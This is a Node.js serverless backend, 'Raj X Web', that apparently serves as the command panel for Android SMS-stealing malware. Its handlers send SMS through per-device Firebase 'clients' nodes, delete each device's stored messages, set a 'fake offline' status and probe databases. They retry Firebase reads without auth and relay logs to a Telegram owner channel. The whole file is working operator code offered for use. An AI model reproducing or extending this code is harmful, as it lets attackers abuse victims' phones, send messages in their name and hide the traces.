// netlify/functions/api.js
// ─────────────────────────────────────────────
// Raj X Web — Secure Backend
// Saara sensitive kaam yahan hota hai.
// Frontend ko BOT_TOKEN / CHANNEL_ID kabhi nahi milta.
// ─────────────────────────────────────────────

const fetch = require('node-fetch');

const BOT_TOKEN      = process.env.BOT_TOKEN;
const CHANNEL_ID     = process.env.CHANNEL_ID;
const OWNER_ID       = process.env.OWNER_ID;
const API_SECRET     = process.env.API_SECRET;
const ALLOWED_ORIGIN = process.env.ALLOWED_ORIGIN || "*";

exports.handler = async (event) => {
  const headers = {
    "Access-Control-Allow-Origin": ALLOWED_ORIGIN,
    "Access-Control-Allow-Headers": "Content-Type, X-Api-Secret",
    "Access-Control-Allow-Methods": "POST, OPTIONS",
    "Content-Type": "application/json",
  };

  if (event.httpMethod === "OPTIONS") {
    return { statusCode: 200, headers, body: "" };
  }

  if (event.httpMethod !== "POST") {
    return { statusCode: 405, headers, body: JSON.stringify({ error: "Method not allowed" }) };
  }

  const clientSecret = event.headers["x-api-secret"];
  if (!API_SECRET || clientSecret !== API_SECRET) {
    return { statusCode: 401, headers, body: JSON.stringify({ error: "Unauthorized" }) };
  }

  let payload;
  try {
    payload = JSON.parse(event.body || "{}");
  } catch (e) {
    return { statusCode: 400, headers, body: JSON.stringify({ error: "Invalid JSON" }) };
  }

  const { action } = payload;

  try {
    switch (action) {
      case "tg_log":         return await handleTgLog(payload, headers);
      case "fb_fetch":       return await handleFbFetch(payload, headers);
      case "fb_get_node":    return await handleFbGetNode(payload, headers);
      case "fb_put_node":    return await handleFbPutNode(payload, headers);
      case "fb_delete_node": return await handleFbDeleteNode(payload, headers);
      case "fb_send_sms":    return await handleFbSendSms(payload, headers);
      case "fb_delete_msg":  return await handleFbDeleteMsg(payload, headers);
      case "fb_set_status":  return await handleFbSetStatus(payload, headers);
      case "fb_probe_db":    return await handleFbProbeDb(payload, headers);
      default:
        return { statusCode: 400, headers, body: JSON.stringify({ error: "Unknown action" }) };
    }
  } catch (err) {
    return { statusCode: 500, headers, body: JSON.stringify({ error: err.message }) };
  }
};

// ─────────────────────────────────────────
// Helper: Firebase URL builder
// ─────────────────────────────────────────
function fbUrl(dbUrl, key, path, params) {
  const base = String(dbUrl || "").replace(/\/+$/, "");
  const p = path ? "/" + path : "";
  const q = new URLSearchParams(params || {});
  if (key) q.set("auth", key);
  const qs = q.toString();
  return base + p + ".json" + (qs ? "?" + qs : "");
}

// ─────────────────────────────────────────
// Telegram log
// ─────────────────────────────────────────
async function handleTgLog(payload, headers) {
  const { text } = payload;
  if (!text) return { statusCode: 400, headers, body: JSON.stringify({ error: "No text" }) };

  if (!BOT_TOKEN || !CHANNEL_ID) {
    return { statusCode: 200, headers, body: JSON.stringify({ ok: false, reason: "Telegram not configured" }) };
  }

  const targets = [CHANNEL_ID, OWNER_ID].filter(Boolean);
  for (const chat_id of targets) {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id, text, parse_mode: "HTML" }),
    }).catch(() => {});
  }
  return { statusCode: 200, headers, body: JSON.stringify({ ok: true }) };
}

// ─────────────────────────────────────────
// Firebase: generic fetch (GET)
// ─────────────────────────────────────────
async function handleFbFetch(payload, headers) {
  const { dbUrl, dbKey, path, params } = payload;
  if (!dbUrl) return { statusCode: 400, headers, body: JSON.stringify({ error: "Missing dbUrl" }) };

  for (const withAuth of [true, false]) {
    try {
      const url = fbUrl(dbUrl, withAuth ? dbKey : "", path, params);
      const res = await fetch(url, { method: "GET" });
      if (res.status === 401 || res.status === 403) continue;
      if (!res.ok) return { statusCode: 200, headers, body: JSON.stringify({ ok: false, status: res.status, data: null }) };
      const data = await res.json();
      return { statusCode: 200, headers, body: JSON.stringify({ ok: true, status: res.status, data }) };
    } catch (e) { /* try next */ }
  }
  return { statusCode: 200, headers, body: JSON.stringify({ ok: false, status: 0, data: null }) };
}

// ─────────────────────────────────────────
// Firebase: get single node
// ─────────────────────────────────────────
async function handleFbGetNode(payload, headers) {
  const { dbUrl, dbKey, path } = payload;
  if (!dbUrl || !path) return { statusCode: 400, headers, body: JSON.stringify({ error: "Missing fields" }) };

  try {
    const url = fbUrl(dbUrl, dbKey, path, {});
    const res = await fetch(url, { method: "GET" });
    if (!res.ok) return { statusCode: 200, headers, body: JSON.stringify({ ok: false, status: res.status, data: null }) };
    const data = await res.json();
    return { statusCode: 200, headers, body: JSON.stringify({ ok: true, status: res.status, data }) };
  } catch (e) {
    return { statusCode: 200, headers, body: JSON.stringify({ ok: false, status: 0, data: null, error: e.message }) };
  }
}

// ─────────────────────────────────────────
// Firebase: PUT node (generic)
// ─────────────────────────────────────────
async function handleFbPutNode(payload, headers) {
  const { dbUrl, dbKey, path, value } = payload;
  if (!dbUrl || !path) return { statusCode: 400, headers, body: JSON.stringify({ error: "Missing fields" }) };

  try {
    const url = fbUrl(dbUrl, dbKey, path, {});
    const res = await fetch(url, {
      method: "PUT",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(value),
    });
    return { statusCode: 200, headers, body: JSON.stringify({ ok: res.ok, status: res.status }) };
  } catch (e) {
    return { statusCode: 200, headers, body: JSON.stringify({ ok: false, status: 0, error: e.message }) };
  }
}

// ─────────────────────────────────────────
// Firebase: DELETE node (generic)
// ─────────────────────────────────────────
async function handleFbDeleteNode(payload, headers) {
  const { dbUrl, dbKey, path } = payload;
  if (!dbUrl || !path) return { statusCode: 400, headers, body: JSON.stringify({ error: "Missing fields" }) };

  try {
    const url = fbUrl(dbUrl, dbKey, path, {});
    const res = await fetch(url, { method: "DELETE" });
    return { statusCode: 200, headers, body: JSON.stringify({ ok: res.ok || res.status === 404, status: res.status }) };
  } catch (e) {
    return { statusCode: 200, headers, body: JSON.stringify({ ok: false, status: 0, error: e.message }) };
  }
}

// ─────────────────────────────────────────
// Firebase: send SMS
// ─────────────────────────────────────────
async function handleFbSendSms(payload, headers) {
  const { dbUrl, dbKey, deviceId, sim, to, message } = payload;
  if (!dbUrl || !deviceId || !to || !message) {
    return { statusCode: 400, headers, body: JSON.stringify({ error: "Missing fields" }) };
  }
  try {
    const url = fbUrl(dbUrl, dbKey, `clients/${deviceId}/webhookEvent/sendSms`, {});
    const res = await fetch(url, {
      method: "PUT",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ from: sim, to, message, isSended: false }),
    });
    return { statusCode: 200, headers, body: JSON.stringify({ ok: res.ok, status: res.status }) };
  } catch (e) {
    return { statusCode: 200, headers, body: JSON.stringify({ ok: false, status: 0, error: e.message }) };
  }
}

// ─────────────────────────────────────────
// Firebase: delete message
// ─────────────────────────────────────────
async function handleFbDeleteMsg(payload, headers) {
  const { dbUrl, dbKey, deviceId, msgId } = payload;
  if (!dbUrl || !deviceId || !msgId) {
    return { statusCode: 400, headers, body: JSON.stringify({ error: "Missing fields" }) };
  }
  try {
    const url = fbUrl(dbUrl, dbKey, `messages/${deviceId}/${msgId}`, {});
    const res = await fetch(url, { method: "DELETE" });
    return { statusCode: 200, headers, body: JSON.stringify({ ok: res.ok || res.status === 404, status: res.status }) };
  } catch (e) {
    return { statusCode: 200, headers, body: JSON.stringify({ ok: false, status: 0, error: e.message }) };
  }
}

// ─────────────────────────────────────────
// Firebase: set status (fake offline)
// ─────────────────────────────────────────
async function handleFbSetStatus(payload, headers) {
  const { dbUrl, dbKey, deviceId, status } = payload;
  if (!dbUrl || !deviceId) {
    return { statusCode: 400, headers, body: JSON.stringify({ error: "Missing fields" }) };
  }
  try {
    const url = fbUrl(dbUrl, dbKey, `clients/${deviceId}/status`, {});
    const res = await fetch(url, {
      method: "PUT",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(!!status),
    });
    return { statusCode: 200, headers, body: JSON.stringify({ ok: res.ok, status: res.status }) };
  } catch (e) {
    return { statusCode: 200, headers, body: JSON.stringify({ ok: false, status: 0, error: e.message }) };
  }
}

// ─────────────────────────────────────────
// Firebase: probe DB (health check)
// ─────────────────────────────────────────
async function handleFbProbeDb(payload, headers) {
  const { dbUrl, dbKey } = payload;
  if (!dbUrl) return { statusCode: 400, headers, body: JSON.stringify({ error: "Missing dbUrl" }) };

  try {
    const url = fbUrl(dbUrl, dbKey, "clients", {});
    const controller = new AbortController();
    const tm = setTimeout(() => controller.abort(), 10000);
    const res = await fetch(url, { signal: controller.signal });
    clearTimeout(tm);
    return {
      statusCode: 200,
      headers,
      body: JSON.stringify({
        ok: res.ok,
        status: res.status,
        authError: res.status === 401 || res.status === 403,
      }),
    };
  } catch (e) {
    return { statusCode: 200, headers, body: JSON.stringify({ ok: false, status: 0, error: e.message }) };
  }
}